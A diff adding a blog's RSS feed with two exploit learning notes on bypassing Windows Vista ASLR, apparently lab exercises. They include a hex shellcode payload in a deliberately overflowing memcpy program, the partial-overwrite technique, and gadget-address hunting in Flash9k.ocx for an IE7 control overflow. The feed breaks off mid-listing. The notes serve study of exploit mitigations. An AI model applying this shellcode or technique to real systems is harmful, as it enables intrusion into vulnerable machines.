@@ -1,0 +1,332 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>ASLR on Misaka's Secrect Garden</title><link>https://blog.moeomu.com/tags/aslr/</link><description>Recent content in ASLR on Misaka's Secrect Garden</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Thu, 26 Nov 2020 17:54:00 +0800</lastBuildDate><atom:link href="https://blog.moeomu.com/tags/aslr/index.xml" rel="self" type="application/rss+xml"/><item><title>Exploit learning notes 018 using partial overlay location</title><link>https://blog.moeomu.com/posts/exploit-learning-notes-018-using-partial-overlay-location/</link><pubDate>Thu, 26 Nov 2020 17:54:00 +0800</pubDate><guid>https://blog.moeomu.com/posts/exploit-learning-notes-018-using-partial-overlay-location/</guid><description>&lt;p>Source: &lt;a class="link" href="https://blog.moeomu.com/posts/exploit-learning-notes-018-using-partial-overlay-location/" >Moeomu&amp;rsquo;s blog&lt;/a>&lt;/p>
+&lt;h2 id="principle">Principle&lt;/h2>
+&lt;ul>
+&lt;li>The image randomization instructions randomize the full two bytes of the image load base address, the consequence of this is that the springboard is always available, so you can use this to bypass ASLR&lt;/li>
+&lt;li>If you attack memcpy, you can control the return value between &lt;code>0xXXXX0000&lt;/code> and &lt;code>0xXXXXFFFF&lt;/code>, and if you attack str-like function attacks, you can control the address to one between &lt;code>0xXXXX0100&lt;/code> and &lt;code>0xXXXX00FF&lt;/code>.&lt;/li>
+&lt;/ul>
+&lt;h2 id="process">Process&lt;/h2>
+&lt;ul>
+&lt;li>first find a jmp eax assembly code within the compiled program, followed by the low word of its address as the &lt;code>off by word&lt;/code> address, fill in the shellcode&lt;/li>
+&lt;li>Calculate the buffer size, after the overflow will be normal&lt;/li>
+&lt;/ul>
+&lt;h2 id="code">Code&lt;/h2>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-cpp" data-lang="cpp">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;memory.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">char&lt;/span> &lt;span class="n">shellcode&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="o">=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&lt;/span>&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="c1">// payload
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x2A\x23&lt;/span>&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="c1">// off by word
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nf">test&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">tt&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">256&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">shellcode&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">262&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">tt&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">temp&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">200&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">test&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="start-experiment">Start experiment&lt;/h2>
+&lt;blockquote>
+&lt;p>Experimental environment: system: Windows Vista SP0, system DEP status: Optin default, compiler: Visual Studio 2008, optimization: disable optimization, GS option: off, DEP option: /NXCOMPAT:NO, build version: release&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>Compile the program, run it, the window pops up directly and succeeds, and restart the same, as shown in the picture&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://blog.moeomu.com/posts/exploit-learning-notes-018-using-partial-overlay-location/success.png"
+width="688"
+height="445"
+srcset="https://blog.moeomu.com/posts/exploit-learning-notes-018-using-partial-overlay-location/success_hube6c3e136f097b87001e3e5a35811a31_69467_480x0_resize_box_3.png 480w, https://blog.moeomu.com/posts/exploit-learning-notes-018-using-partial-overlay-location/success_hube6c3e136f097b87001e3e5a35811a31_69467_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Success"
+class="gallery-image"
+data-flex-grow="154"
+data-flex-basis="371px"
+>&lt;/p></description></item><item><title>Exploit learning notes 017 ASLR Introduction</title><link>https://blog.moeomu.com/posts/exploit-learning-notes-017-aslr-introduction/</link><pubDate>Tue, 24 Nov 2020 21:12:00 +0800</pubDate><guid>https://blog.moeomu.com/posts/exploit-learning-notes-017-aslr-introduction/</guid><description>&lt;p>Source: &lt;a class="link" href="https://blog.moeomu.com/posts/exploit-learning-notes-017-aslr-introduction/" >Moeomu&amp;rsquo;s blog&lt;/a>&lt;/p>
+&lt;h2 id="introduction-to-aslr-techniques">Introduction to ASLR techniques&lt;/h2>
+&lt;blockquote>
+&lt;p>Throughout, all of the previously described vulnerability exploitation methods share a common feature: they all require the identification of a clear jump address. Whether it is a generic springboard instruction such as JMP ESP or the various instructions used by Ret2Libc, we need to determine the entry point of this instruction first. As the saying goes, Microsoft&amp;rsquo;s ASLR (Address Space Layout Randomization) technology is a protection mechanism that interferes with shellcode positioning by no longer using a fixed base address to load the program&lt;/p>
+&lt;p>In fact, the concept of ASLR has been introduced in the Windows XP era, but the ASLR function on XP is very limited, only a simple randomization of PEB and TEB, but no randomization of the module load base address, until Windows Vista appeared, ASLR really began to work!&lt;/p>
+&lt;p>Similar to SafeSEH, ASLR implementation requires both program support and OS support, where program support is not required.&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>Microsoft has added the &lt;code>/dynamicbase&lt;/code> linking option since Visual Studio 2005 SP1 to help us with this task. We just need to enable the &lt;code>/ddynmicbase&lt;/code> linking option when we compile the program, and the compiled program will support ASLR&lt;/li>
+&lt;/ul>
+&lt;h3 id="image-randomization">Image randomization&lt;/h3>
+&lt;ul>
+&lt;li>Image randomization is the process of randomizing the virtual address of the PE file loaded when it is mapped to memory, this address is determined at system startup and will change after system reboot&lt;/li>
+&lt;li>Probably for compatibility reasons, Microsoft has set a switch for image randomization in the system, which users can set by setting the registry key &lt;code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionM anager\MemoryManagement\ MoveImages&lt;/code> key to set the working mode of image randomization
+&lt;ul>
+&lt;li>When set to &lt;code>0&lt;/code>, image randomization is disabled&lt;/li>
+&lt;li>When set to &lt;code>-1&lt;/code>, randomizable images are forced to be processed with or without the &lt;code>IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE&lt;/code> flag set&lt;/li>
+&lt;li>Normal mode of operation when set to other values, only images with the randomized processing flag are processed&lt;/li>
+&lt;li>If &lt;code>MoveImages&lt;/code> does not exist in the registry, you can manually create a value with the name &lt;code>MoveImages&lt;/code> and the type &lt;code>DWORD&lt;/code> and set its value as needed&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="stack-randomization">Stack randomization&lt;/h3>
+&lt;ul>
+&lt;li>This measure is to randomly select the base address of the stack when the program is running. The difference with image base randomization is that the base address of the stack is not determined when the system is started, but when the program is opened, which means that the base address of the stack is different for any two runs of the same program, and thus the location of each variable in memory is not determined.&lt;/li>
+&lt;li>Compile the following program in VS2008, run it twice on XP and Vista, and get the following result&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-cpp" data-lang="cpp">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">heap&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">malloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">stack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Address of heap:%#0.4x&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">Address of stack:%#0.4x&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">heap&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">stack&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">getchar&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://blog.moeomu.com/Windows%20Vista.png"
+loading="lazy"
+alt="Windows Vista"
+>
+&lt;img src="https://blog.moeomu.com/Windows%20XP.png"
+loading="lazy"
+alt="Windows XP"
+>&lt;/p>
+&lt;ul>
+&lt;li>As you can see, the heap addresses are far apart on Vista, while they are identical on XP&lt;/li>
+&lt;/ul>
+&lt;h3 id="randomization-of-peb-and-teb">Randomization of PEB and TEB&lt;/h3>
+&lt;ul>
+&lt;li>Getting the TEB and PEB of the current process is simple, the TEB is stored at &lt;code>FS:0&lt;/code> and &lt;code>FS:[0x18]&lt;/code> and the PEB is stored at the TEB offset &lt;code>0x30&lt;/code>, you can get the TEB and PEB of the current process by the following code&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-cpp" data-lang="cpp">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">teb&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">peb&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">__asm&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mov&lt;/span> &lt;span class="n">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nl">FS&lt;/span>&lt;span class="p">:[&lt;/span>&lt;span class="mh">0x18&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mov&lt;/span> &lt;span class="n">teb&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">eax&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mov&lt;/span> &lt;span class="n">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">dword&lt;/span> &lt;span class="n">ptr&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">eax&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mh">0x30&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mov&lt;/span> &lt;span class="n">peb&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">eax&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;PEB:%#x&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">TEB:%#x&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">peb&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">teb&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">getchar&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Test run on Vista, the results are as shown&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://blog.moeomu.com/posts/exploit-learning-notes-017-aslr-introduction/PEB-TEB-random-Vista.png"
+width="445"
+height="223"
+srcset="https://blog.moeomu.com/posts/exploit-learning-notes-017-aslr-introduction/PEB-TEB-random-Vista_hu00ba9e2f2bf089356c2e504e0ca73284_72259_480x0_resize_box_3.png 480w, https://blog.moeomu.com/posts/exploit-learning-notes-017-aslr-introduction/PEB-TEB-random-Vista_hu00ba9e2f2bf089356c2e504e0ca73284_72259_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="PEB-TEB-random-Vista"
+class="gallery-image"
+data-flex-grow="199"
+data-flex-basis="478px"
+>&lt;/p>
+&lt;ul>
+&lt;li>As you can see, the result is very poor, the PEB address is only randomized by one byte, and it is still very regular, the TEB is basically unchanged&lt;/li>
+&lt;/ul>
+&lt;h3 id="defects-of-aslr">Defects of ASLR&lt;/h3>
+&lt;ul>
+&lt;li>It is not difficult to see that when ASLR randomizes the image, although the module load base address has changed, but the entry point of each module&amp;rsquo;s lower two bytes will not change, for example: the original base address: &lt;code>0x00401234&lt;/code>, after randomization the base address becomes: &lt;code>0x67291234&lt;/code>, so you can use this to attack it&lt;/li>
+&lt;/ul>
+&lt;h2 id="attack-the-module-without-aslr-enabled">Attack the module without ASLR enabled&lt;/h2>
+&lt;h3 id="preparation">Preparation&lt;/h3>
+&lt;blockquote>
+&lt;p>Experimental environment: Windows Vista SP0, IE7, Adobe Flash Player 9.0.124&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>Although the book requires the use of version 9.0.262, but I really can not find it, so I will use 9.0.124 instead, &lt;a class="link" href="https://pan.moeomu.com/Tutorial/0Day%e5%ae%89%e5%85%a8-%e8%b5%84%e6%96%99/flashplayer9r124_winax.exe" target="_blank" rel="noopener"
+>click here to download&lt;/a>&lt;/li>
+&lt;li>The vulnerable OCX control has already been compiled in the previous experiment, so use that one, &lt;a class="link" href="https://pan.moeomu.com/Tutorial/0Day%e5%ae%89%e5%85%a8-%e8%b5%84%e6%96%99/VulnerAX_SEH/VulnerAX_SEH.ocx" target="_blank" rel="noopener"
+>click here to download&lt;/a>, this control ctrl class object id: &lt;code>ACA3927C-6BD1-4B4E-8697-72481279AAEC&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h3 id="steps">Steps&lt;/h3>
+&lt;ul>
+&lt;li>Reboot the system to see the ASLR module enabled&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://blog.moeomu.com/ASLR%20not%20enabled%20status.png"
+loading="lazy"
+alt="ASLR not enabled status"
+>&lt;/p>
+&lt;ul>
+&lt;li>Experimental control is not enabled GS&lt;/li>
+&lt;li>Load POC page and Flash9k.ocx via IE7&lt;/li>
+&lt;li>There is a stack overflow vulnerability in the function test, which aims to overwrite the return address of the function&lt;/li>
+&lt;li>Because Flash9k.ocx is not ASLR enabled, the load base address is fixed, so you can search for a suitable springboard instruction inside to jump to shellcode&lt;/li>
+&lt;li>IE7&amp;rsquo;s DEP is turned off, so the impact of DEP is not considered&lt;/li>
+&lt;li>Since the attack is achieved by overwriting the return address of the function, the best springboard instruction is JMP ESP&lt;/li>
+&lt;li>&lt;code>0x301D606B&lt;/code> is also &lt;code>JMP ESP&lt;/code>, which will jump to the head of the string after execution, but the problem is that the four bytes of &lt;code>6B 60 1D 30&lt;/code> constitute exactly one line of assembly instruction &lt;code>imul esp,dword ptr ds:[eax+0x1D],0x30&lt;/code>, which will multiply the last two operands and subsequently put them into the first operand So it needs to keep the value of &lt;code>[eax+0x1D]&lt;/code> correct, and currently eax is not pointing to a valid address, so it needs to fix eax&lt;/li>
+&lt;li>Unfortunately, there is no suitable instruction for fixing eax, so change the address&lt;/li>
+&lt;li>&lt;code>0x303911D3&lt;/code> is also &lt;code>JMP ESP&lt;/code>, but the assembly code it consists of will read both EC and EAX, so both registers need to be repaired, not feasible, change instruction&lt;/li>
+&lt;li>&lt;code>JMP ESP&lt;/code> is not available, use &lt;code>JMP ESI&lt;/code> instead, address &lt;code>0x3000DCD2&lt;/code> contains 0, directly excluded, address &lt;code>0x302420C3&lt;/code> the last byte is retn, can not be used, excluded, address &lt;code>0x3028EE6E&lt;/code> assembly code will directly cause an exception, excluded, this instruction is also no longer suitable, so look for other suitable instruction&lt;/li>
+&lt;li>The &lt;code>CALL ESP&lt;/code> at address &lt;code>0x300942F2&lt;/code> seems to be suitable, it will also increase the esp by 8 bytes to avoid the garbage data.&lt;/li>
+&lt;li>Here is the shellcode after the change&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
